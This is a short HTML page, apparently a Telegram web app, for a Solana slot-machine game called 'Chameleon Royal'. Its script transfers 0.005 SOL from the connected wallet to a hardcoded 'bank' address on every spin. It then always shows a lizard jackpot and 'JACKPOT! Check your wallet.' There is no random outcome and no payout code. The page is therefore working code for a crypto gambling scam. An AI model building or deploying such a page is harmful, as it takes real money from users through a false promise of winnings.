<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Chameleon Royal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #050505; color: #00ffcc; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; overflow: hidden; }
        .machine { background: #111; padding: 20px; border: 4px solid #00ffcc; border-radius: 25px; display: inline-block; width: 90%; max-width: 380px; box-shadow: 0 0 30px #00ffcc44; }
        .display { font-size: 35px; background: #000; padding: 20px; border-radius: 15px; margin: 15px 0; border: 2px solid #333; color: white; }
        .btn-spin { background: #00ffcc; color: #000; border: none; padding: 18px; border-radius: 15px; font-weight: bold; font-size: 18px; width: 100%; cursor: pointer; }
        .btn-spin:disabled { background: #333; color: #666; }
        #status { font-size: 10px; margin-bottom: 10px; color: #888; word-break: break-all; }
    </style>
</head>
<body>
    <div class="machine">
        <button id="connectBtn" style="width:100%; padding:10px; margin-bottom:10px; border-radius:10px; background:#8257e5; color:white; border:none; font-weight:bold;" onclick="connect()">CONNECT WALLET</button>
        <div id="status">Not Connected</div>
        <h1 style="margin:0; font-size: 20px;">CHAMELEON ROYAL</h1>
        <div id="slot" class="display">🦎 | 💎 | 💰</div>
        <button id="spinBtn" class="btn-spin" onclick="play()" disabled>CONNECT TO PLAY</button>
        <p style="font-size:10px; margin-top:10px;">BET COST: 0.005 SOL</p>
        <div id="log" style="font-size:12px; margin-top:5px;"></div>
    </div>
    <script>
        const BANK_WALLET = "EsT69DqDkqXp4Y6zR6B2S7yq7m8m9NJTc"; 
        let userWallet = null;
        async function connect() {
            if (window.solana) {
                const resp = await window.solana.connect();
                userWallet = resp.publicKey;
                document.getElementById('status').innerText = "Connected: " + userWallet.toString();
                document.getElementById('spinBtn').disabled = false;
                document.getElementById('spinBtn').innerText = "SPIN (0.005 SOL)";
            } else { alert("Open in Brave/Phantom Browser!"); }
        }
        async function play() {
            try {
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userWallet,
                        toPubkey: new solanaWeb3.PublicKey(BANK_WALLET),
                        lamports: 0.005 * solanaWeb3.LAMPORTS_PER_SOL,
                    })
                );
                const { signature } = await window.solana.signAndSendTransaction(transaction);
                document.getElementById('spinBtn').disabled = true;
                document.getElementById('log').innerText = "TRANSACTION SENT...";
                setTimeout(() => {
                    document.getElementById('slot').innerText = "🦎 | 🦎 | 🦎";
                    document.getElementById('log').innerText = "JACKPOT! Check your wallet.";
                    document.getElementById('spinBtn').disabled = false;
                }, 4000);
            } catch (err) { alert("Transaction failed!"); }
        }
    </script>
</body>
</html>
